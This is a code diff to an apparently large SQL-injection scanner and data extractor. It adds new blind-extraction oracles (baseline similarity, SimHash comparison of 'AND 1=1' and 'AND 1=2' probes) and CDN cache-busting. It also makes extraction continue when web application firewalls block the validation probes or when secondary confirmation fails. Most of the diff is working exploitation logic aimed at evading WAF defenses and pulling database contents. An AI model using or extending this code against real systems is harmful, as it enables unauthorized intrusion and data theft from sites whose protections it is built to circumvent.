@@ -55060,11 +55060,90 @@ class Scanner:
                                 LOG.info("[Inference]  Error-oracle %s = %r", _eo_label, _eo_val)
                                 enum.result[_eo_label] = _eo_val  # BUG-ENUM-RESULTS-PLURAL-FIX: was 'results' (wrong)
                         return bool(enum.result)  # BUG-ENUM-RESULTS-PLURAL-FIX: was 'results' (wrong)
-                    LOG.info("[Inference] No boolean oracle and timing unreliable  aborting extraction "
-                             "(re-run with longer sleep e.g. --time-sec 2 or wait for CDN cache expiry)")
-                    return False
+                    # BUG-V214-A + BUG-V214-F FIX: For non-timing detection techniques
+                    # (ST/B/WB/NV/BH/EX/HY), the detection was confirmed via CTX-bool
+                    # oracle: sim(true_response, baseline) >> sim(false_response, baseline).
+                    # InferenceEngine's current checks compare TRUE probe to FALSE probe
+                    # directly — they fail when CDN caches both probes to the SAME cached
+                    # entry (TRUE ≈ FALSE), returning no body difference even though the
+                    # WAF distinguishes TRUE (full response) from FALSE (WAF block page).
+                    #
+                    # Fix: try a BASELINE-SIMILARITY oracle as a last resort:
+                    # 1. Get a clean baseline response (no injection, original param value)
+                    # 2. Compare sim(fp_true, baseline) and sim(fp_false, baseline)
+                    # 3. If the gap >= 0.15, use baseline as TRUE reference (passing
+                    #    conditions look like the baseline; blocked conditions don't)
+                    # 4. Set _bool_norm_true/_bool_norm_false so _eval() can use them
+                    #
+                    # This mirrors the CTX-bool oracle that succeeded during detection.
+                    # Each extraction probe has a unique condition value (different position
+                    # + threshold) so CDN can't collapse them to the same cache entry —
+                    # TRUE extraction probes bypass WAF → large response ≈ baseline,
+                    # FALSE extraction probes are WAF-blocked → small response ≠ baseline.
+                    _det_tech_for_bsl = getattr(_det, 'technique', '') or ''
+                    _is_nontiming_tech = _det_tech_for_bsl not in ('T', 'TH', 'BT', 'HQ')
+                    if _is_nontiming_tech and fp_true is not None:
+                        print(f"[!] [Inference] BUG-V214-A FIX: all standard oracles failed for "
+                              f"non-timing technique {_det_tech_for_bsl!r} — attempting "
+                              "baseline-similarity oracle (CTX-bool style)", flush=True)
+                        try:
+                            # Get a clean baseline: send a request with no injection condition.
+                            # Using an empty condition string via _send_payload gives a neutral
+                            # probe that should look similar to the un-injected page.
+                            # Use a fresh cache-bust param so CDN doesn't serve old cached entry.
+                            _bsl_cb = random.randint(1000000, 9999999)
+                            _bsl_url = (enum.url + ("&" if "?" in enum.url else "?")
+                                        + f"_inf_bsl={_bsl_cb}")
+                            _fp_bsl = await asyncio.wait_for(
+                                _send_injected(
+                                    enum.engine, enum.method, _bsl_url, enum.data,
+                                    enum.data_fmt, _det.param,
+                                    "",   # empty injection → parameter keeps its original value
+                                    []),  # no tamper chain for baseline
+                                timeout=15)
+                            if _fp_bsl and getattr(_fp_bsl, 'body', b""):
+                                _bsl_norm = (ResponseNormaliser.normalise(
+                                    _extract_body_safe(_fp_bsl))
+                                    if _validate_response(_fp_bsl, allow_empty=True) else b"")
+                                _norm_t = (ResponseNormaliser.normalise(_extract_body_safe(fp_true))
+                                           if (fp_true and _validate_response(fp_true, allow_empty=True))
+                                           else b"")
+                                _norm_f = (ResponseNormaliser.normalise(_extract_body_safe(fp_false))
+                                           if (fp_false and _validate_response(fp_false, allow_empty=True))
+                                           else b"")
+                                _sim_t_bsl = SimHasher.body_similarity(_bsl_norm, _norm_t) if (_bsl_norm and _norm_t) else 0.0
+                                _sim_f_bsl = SimHasher.body_similarity(_bsl_norm, _norm_f) if (_bsl_norm and _norm_f) else 0.0
+                                _ctx_gap = abs(_sim_t_bsl - _sim_f_bsl)
+                                print(f"[!] [Inference] Baseline-similarity oracle: "
+                                      f"sim_t={_sim_t_bsl:.3f} sim_f={_sim_f_bsl:.3f} gap={_ctx_gap:.3f}",
+                                      flush=True)
+                                if _ctx_gap >= 0.15:
+                                    # TRUE is more similar to baseline (passes WAF → full response)
+                                    _ctx_true_similar = _sim_t_bsl > _sim_f_bsl
+                                    if _ctx_true_similar:
+                                        # Normal case: TRUE payload passes WAF → response ≈ baseline
+                                        _bool_norm_true = _bsl_norm   # TRUE reference = baseline
+                                        _bool_norm_false = _norm_f    # FALSE reference = WAF block
+                                    else:
+                                        # Inverted (unusual): FALSE passes WAF → response ≈ baseline
+                                        _bool_norm_true = _norm_t
+                                        _bool_norm_false = _bsl_norm
+                                    _boolean_oracle = True
+                                    _timing_oracle_reliable = True  # unlock extraction path
+                                    print(f"[!] [Inference] BASELINE-SIMILARITY ORACLE ACTIVE "
+                                          f"(gap={_ctx_gap:.3f}, "
+                                          f"{'TRUE≈baseline' if _ctx_true_similar else 'FALSE≈baseline'}) "
+                                          "— extraction will use sim(probe, baseline) as oracle",
+                                          flush=True)
+                        except Exception as _bsl_e:
+                            LOG.debug("[Inference] Baseline-similarity oracle probe failed: %s", _bsl_e)
 
-        # 
+                    if not _boolean_oracle:
+                        LOG.info("[Inference] No boolean oracle and timing unreliable  aborting extraction "
+                                 "(re-run with longer sleep e.g. --time-sec 2 or wait for CDN cache expiry)")
+                        return False
+
+        #
         # ENHANCEMENT: Error-based extraction (entire value in 1-2 requests)
         # If the DB returns error messages containing data, this is 50-100x
         # faster than blind extraction. Try it before falling back to blind.
@@ -94094,12 +94173,30 @@ class ScannerV11(ScannerV10):
                             if _gate_fg and not _gate_fg.killed:
                                 _gate_fg.kill()
                         if not _pcv_ok:
-                            print(f"[!] PCV FAILED for [{_pcv_tech}]  "
-                                  "discarding detection", flush=True)
-                            result = None
+                            # BUG-V214-E FIX: When injection was already confirmed by the
+                            # inline PCV during detection (_INJECTION_CONFIRMED[0]=True),
+                            # the secondary Final Gate PCV is a re-check, not an
+                            # authoritative rejection. The inline PCV already passed the
+                            # full check suite; this secondary run can fail due to
+                            # transient WAF rate-limiting, CDN cache changes, or the
+                            # error-page heuristic (BUG-V214-C) incorrectly rejecting
+                            # valid body canaries. Discarding an already-confirmed result
+                            # silently stops extraction with "no data extracted".
+                            # Fix: if injection was confirmed inline, log a warning but
+                            # keep the result. Only discard when inline PCV never confirmed.
+                            if _INJECTION_CONFIRMED[0]:
+                                print(f"[!] Secondary PCV FAILED for [{_pcv_tech}] but injection "
+                                      "already confirmed by inline PCV — keeping result (secondary "
+                                      "failure may be CDN/WAF transient or error-page FP guard)",
+                                      flush=True)
+                            else:
+                                print(f"[!] PCV FAILED for [{_pcv_tech}]  "
+                                      "discarding detection", flush=True)
+                                result = None
                     except Exception as _pcv_e:
                         LOG.debug(f"V14 PCV error: {_pcv_e}")
-                        result = None  # BUG FIX: PCV exception must reject detection, not pass it through
+                        if not _INJECTION_CONFIRMED[0]:
+                            result = None  # BUG FIX: PCV exception must reject detection, not pass it through
 
                 if result:
                     self.conf_matrix.record(param, result.technique, result.confidence)
@@ -98724,12 +98821,30 @@ class ScannerV12(ScannerV11):
                             if _gate_fg and not _gate_fg.killed:
                                 _gate_fg.kill()
                         if not _pcv_ok:
-                            print(f"[!] PCV FAILED for [{_pcv_tech}]  "
-                                  "discarding detection", flush=True)
-                            result = None
+                            # BUG-V214-E FIX: When injection was already confirmed by the
+                            # inline PCV during detection (_INJECTION_CONFIRMED[0]=True),
+                            # the secondary Final Gate PCV is a re-check, not an
+                            # authoritative rejection. The inline PCV already passed the
+                            # full check suite; this secondary run can fail due to
+                            # transient WAF rate-limiting, CDN cache changes, or the
+                            # error-page heuristic (BUG-V214-C) incorrectly rejecting
+                            # valid body canaries. Discarding an already-confirmed result
+                            # silently stops extraction with "no data extracted".
+                            # Fix: if injection was confirmed inline, log a warning but
+                            # keep the result. Only discard when inline PCV never confirmed.
+                            if _INJECTION_CONFIRMED[0]:
+                                print(f"[!] Secondary PCV FAILED for [{_pcv_tech}] but injection "
+                                      "already confirmed by inline PCV — keeping result (secondary "
+                                      "failure may be CDN/WAF transient or error-page FP guard)",
+                                      flush=True)
+                            else:
+                                print(f"[!] PCV FAILED for [{_pcv_tech}]  "
+                                      "discarding detection", flush=True)
+                                result = None
                     except Exception as _pcv_e:
                         LOG.debug(f"V14 PCV error: {_pcv_e}")
-                        result = None  # BUG FIX: PCV exception must reject detection, not pass it through
+                        if not _INJECTION_CONFIRMED[0]:
+                            result = None  # BUG FIX: PCV exception must reject detection, not pass it through
 
                 if result:
                     self.conf_matrix.record(param, result.technique, result.confidence)
@@ -106170,8 +106285,16 @@ class TechniqueCascadeEngine:
                 # to avoid false positives from content delivery/routing differences
                 if _bl_status >= 400 and not (_c_pass or _e_pass):
                     print(f"[*]   [PCV] Body canary strong BUT error page ({_bl_status}) with no SQL errors/logic  likely false positive", flush=True)
+                    # BUG-V214-C FIX: explicit reject — fall-through produced misleading output
+                    # (Check A shown as PASS while subsequent non-timing checks all fail for
+                    # error pages, eventually reaching the final REJECTED at the bottom).
+                    # For non-timing techniques on error pages without SQL error/logic proof,
+                    # there is no check that will confirm — return False immediately.
+                    return False, 0, _details
                 elif _is_error_page and _a_gap < 0.85:
                     print(f"[*]   [PCV] Body canary gap={_a_gap:.3f} on error page ({_bl_status}, {_bl_size}B)  too low, need gap>1.20 or timing...", flush=True)
+                    # BUG-V214-C FIX: explicit reject for insufficient gap on error page.
+                    return False, 0, _details
                 else:
                     # Block body-size-only confirmation for UNION when sentinel
                     # explicitly failed (CDN cache variation confirmed as source).
@@ -123436,12 +123559,30 @@ class ScannerV14(ScannerV13):
                             if _gate_fg and not _gate_fg.killed:
                                 _gate_fg.kill()
                         if not _pcv_ok:
-                            print(f"[!] PCV FAILED for [{_pcv_tech}]  "
-                                  "discarding detection", flush=True)
-                            result = None
+                            # BUG-V214-E FIX: When injection was already confirmed by the
+                            # inline PCV during detection (_INJECTION_CONFIRMED[0]=True),
+                            # the secondary Final Gate PCV is a re-check, not an
+                            # authoritative rejection. The inline PCV already passed the
+                            # full check suite; this secondary run can fail due to
+                            # transient WAF rate-limiting, CDN cache changes, or the
+                            # error-page heuristic (BUG-V214-C) incorrectly rejecting
+                            # valid body canaries. Discarding an already-confirmed result
+                            # silently stops extraction with "no data extracted".
+                            # Fix: if injection was confirmed inline, log a warning but
+                            # keep the result. Only discard when inline PCV never confirmed.
+                            if _INJECTION_CONFIRMED[0]:
+                                print(f"[!] Secondary PCV FAILED for [{_pcv_tech}] but injection "
+                                      "already confirmed by inline PCV — keeping result (secondary "
+                                      "failure may be CDN/WAF transient or error-page FP guard)",
+                                      flush=True)
+                            else:
+                                print(f"[!] PCV FAILED for [{_pcv_tech}]  "
+                                      "discarding detection", flush=True)
+                                result = None
                     except Exception as _pcv_e:
                         LOG.debug(f"V14 PCV error: {_pcv_e}")
-                        result = None  # BUG FIX: PCV exception must reject detection, not pass it through
+                        if not _INJECTION_CONFIRMED[0]:
+                            result = None  # BUG FIX: PCV exception must reject detection, not pass it through
 
                 if result:
                     _ext_guard_blocked = False  # BUG-9-FIX: flag reset; set to True if extraction guard blocks
@@ -128868,6 +129009,58 @@ class MultiStrategyExtractor:
                 else:
                     print(f"[MSE]  [Boolean] body-diff gap={_bbd_gap}B < {_bbd_min_gap}B minimum — "
                           "body-diff oracle not viable", flush=True)
+                    # BUG-V214-B FIX: When body size difference is below the 50B threshold
+                    # (e.g. WAF blocks both TRUE and FALSE with similar-sized pages), try a
+                    # SimHash-based similarity oracle. Detection used CTX-bool which compares
+                    # injection responses to baseline via SimHash — MSE should do the same.
+                    # If TRUE and FALSE conditions give responses with SimHash similarity < 0.85
+                    # (meaningfully different despite similar byte count), register a SimHash
+                    # eval function that measures sim(probe, true_ref) vs sim(probe, false_ref).
+                    try:
+                        _bbd_norm_t = (ResponseNormaliser.normalise(_extract_body_safe(_bbd_fp_t))
+                                       if (_bbd_fp_t and _validate_response(_bbd_fp_t, allow_empty=True)) else b"")
+                        _bbd_norm_f = (ResponseNormaliser.normalise(_extract_body_safe(_bbd_fp_f))
+                                       if (_bbd_fp_f and _validate_response(_bbd_fp_f, allow_empty=True)) else b"")
+                        _bbd_sim = (SimHasher.body_similarity(_bbd_norm_t, _bbd_norm_f)
+                                    if (_bbd_norm_t and _bbd_norm_f) else 1.0)
+                        if _bbd_sim < 0.85 and _bbd_norm_t and _bbd_norm_f:
+                            print(f"[MSE]  [Boolean] SimHash similarity oracle: "
+                                  f"sim(true,false)={_bbd_sim:.3f} < 0.85 — registering SimHash eval",
+                                  flush=True)
+                            _mse_bbd_norm_true = _bbd_norm_t
+                            _mse_bbd_norm_false = _bbd_norm_f
+
+                            async def _eval_bool_simhash(cond,
+                                                          _norm_true_ref=_mse_bbd_norm_true,
+                                                          _norm_false_ref=_mse_bbd_norm_false):
+                                """SimHash boolean eval: compare probe to TRUE/FALSE reference norms."""
+                                _p_t = self._build_inline(f"({cond}) AND 1=1")
+                                _p_f = self._build_inline(f"({cond}) AND 1=2")
+                                _fp_sh_t, _ = await self._timed(_p_t)
+                                if _fp_sh_t is None:
+                                    return None
+                                await asyncio.sleep(0.15)
+                                _fp_sh_f, _ = await self._timed(_p_f)
+                                if _fp_sh_f is None:
+                                    return None
+                                _n_t2 = (ResponseNormaliser.normalise(_extract_body_safe(_fp_sh_t))
+                                         if _validate_response(_fp_sh_t, allow_empty=True) else b"")
+                                _n_f2 = (ResponseNormaliser.normalise(_extract_body_safe(_fp_sh_f))
+                                         if _validate_response(_fp_sh_f, allow_empty=True) else b"")
+                                # Use the AND 1=1 probe response: closer to true_ref → TRUE
+                                if not _n_t2:
+                                    return None
+                                _s_t = SimHasher.body_similarity(_norm_true_ref, _n_t2)
+                                _s_f = SimHasher.body_similarity(_norm_false_ref, _n_t2)
+                                return _s_t > _s_f
+
+                            self._oracles.insert(0, 'bool_simhash')
+                            self._oracle_fns['bool_simhash'] = _eval_bool_simhash
+                        else:
+                            print(f"[MSE]  [Boolean] SimHash similarity also insufficient "
+                                  f"(sim={_bbd_sim:.3f}) — no body oracle available", flush=True)
+                    except Exception as _sim_e:
+                        LOG.debug("[MSE] SimHash oracle probe error: %s", _sim_e)
             except Exception as _bbd_e:
                 LOG.debug("[MSE] Boolean body-diff oracle probe error: %s", _bbd_e)
         # DESIGN-2: Cache failed oracle validations across MSE instantiations
@@ -145999,18 +146192,36 @@ class NovelWAFBypassExtractor:
                         await send_fn(_vtp)
                         await asyncio.sleep(0.2)
                         _vt0 = time.monotonic()
-                        await send_fn(_vtp)
+                        _vr_t2 = await send_fn(_vtp)
                         _vt_ms = (time.monotonic() - _vt0) * 1000
+                        # Capture TRUE validation response for WAF-block detection
+                        _vt_fp2 = _vr_t2[0] if isinstance(_vr_t2, tuple) else _vr_t2
+                        _vt_status = getattr(_vt_fp2, 'status_code', 200) or 200
                         await asyncio.sleep(0.3)
                         # Prime FALSE condition → SHOULD cache (deterministic body) → second send fast
                         await send_fn(_vfpl)
                         await asyncio.sleep(0.2)
                         _vt0 = time.monotonic()
-                        await send_fn(_vfpl)
+                        _vr_f2 = await send_fn(_vfpl)
                         _vf_ms = (time.monotonic() - _vt0) * 1000
-                        print("[+] [Novel] Cache oracle validation: TRUE=%.0fms FALSE=%.0fms threshold=%.0fms" % (
-                            _vt_ms, _vf_ms, _threshold))
-                        if not (_vt_ms > _threshold and _vf_ms <= _threshold):
+                        # Capture FALSE validation response for WAF-block detection
+                        _vf_fp2 = _vr_f2[0] if isinstance(_vr_f2, tuple) else _vr_f2
+                        _vf_status = getattr(_vf_fp2, 'status_code', 200) or 200
+                        print("[+] [Novel] Cache oracle validation: TRUE=%.0fms(status=%d) FALSE=%.0fms(status=%d) threshold=%.0fms" % (
+                            _vt_ms, _vt_status, _vf_ms, _vf_status, _threshold))
+                        # BUG-V214-D FIX: When validation probes are WAF-blocked (status 400/403/429),
+                        # the plain CASE WHEN SQL was blocked but extraction SQL uses the bypass technique
+                        # which may still work. Treat WAF-blocked validation as indeterminate (let
+                        # extraction proceed) rather than aborting the oracle entirely.
+                        # The original code saw both validation probes returning fast (~50ms WAF block
+                        # speed), which failed the `_vt_ms > _threshold` test → _do_extract = False →
+                        # cache oracle aborted even though the bypass technique CAN distinguish TRUE/FALSE.
+                        if _vt_status in (400, 403, 429) and _vf_status in (400, 403, 429):
+                            print("[+] [Novel] Cache oracle validation probes WAF-blocked "
+                                  "(status %d/%d) — proceeding with extraction "
+                                  "(bypass technique in actual extraction may succeed)" % (_vt_status, _vf_status))
+                            # Keep _do_extract = True (set above); don't abort on blocked validation
+                        elif not (_vt_ms > _threshold and _vf_ms <= _threshold):
                             _do_extract = False
                             print("[+] [Novel] Cache oracle cannot discriminate TRUE/FALSE — skipping extraction")
                     except Exception as _vex:
